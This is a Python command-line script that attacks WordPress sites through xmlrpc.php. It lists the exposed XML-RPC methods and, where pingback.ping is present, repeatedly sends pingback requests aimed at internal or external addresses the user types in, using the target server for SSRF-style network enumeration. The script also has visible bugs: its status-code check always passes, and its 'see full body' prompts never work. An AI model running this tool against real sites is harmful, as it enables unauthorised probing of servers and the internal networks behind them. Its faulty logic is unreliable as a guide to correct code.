import requests
import sys
import time


def starting():

    if len(sys.argv) != 2:
        print("Usage: python3 "+sys.argv[0]+" http://domain.com")
        exit(0)

    url = str(sys.argv[1])

    if url[:4] != "http":
        url = "http://"+url
        print("If the website is using HTTPS, ensure to run the command with the complete argument (i.e., HTTPS://$domain)\nChecking\n[*] "+url)

    try:
        x = requests.get(url)
        httpcode = str(x.status_code)
        if "2" or "3" == httpcode[0]:
            print(url+" is accessible\n")
        else:
            print("Status code: "+httpcode)
    except requests.exceptions.MissingSchema:
        print("No response was received... Trying anyway\n")

    if url[-1] == "/":
        url = url[:-1]

    return url

def post(url):

    print("[*] Triggering request to "+url+"/xmlrpc.php\n")


    y = requests.post(url+"/xmlrpc.php", data="<methodCall>\n<methodName>system.listMethods</methodName>\n<params></params>\n</methodCall>")
    
    answer=str(input("Do you want to see the full body? [N/y]: "))
    if answer.lower == "y":
        print(y.text)

    premodules = ["getUserBlogs", "getCategories", "metaWeblog.getUsersBlogs"]
    modules = []
    for i in premodules:
        if i in y.text:
            modules.append(i)

    print("[*] Checking interesting modules")
    time.sleep(2)

    if len(modules) > 0:
        print("Seems interesting: "+str(modules)+" - May be good to use wp-scan as well")

    if "pingback.ping" in y.text:
        print("\n[*] Pingback available.\n")
        try:
            while True:
                enum=input("[*] Ctl+C to exit\n[*] Internal/External IP/FQDN to test (e.g., http://192.168.1.15:80): ")
                y = requests.post(url+"/xmlrpc.php", data="<methodCall>\n<methodName>pingback.ping</methodName>\n<params><param>\n<value><string>"+enum+"</string></value>\n</param><param><value><string>"+url+"/?=1</string>\n</value></param></params>\n</methodCall>")
                if "<value><int>0" in y.text:
                    print("No enumeration available\nChecking response content\n")
                    time.sleep(2)
                    answer = str(input("[*] Do you want to see the full body? [N/y]: "))
                    if answer.lower == "y":
                        print (y.text)
                else:
                    print("[*] Seems a low hanging fruit?")
                    print(y.text)
        except:
            pass

def main():
    initial=starting()
    post(initial)

main()

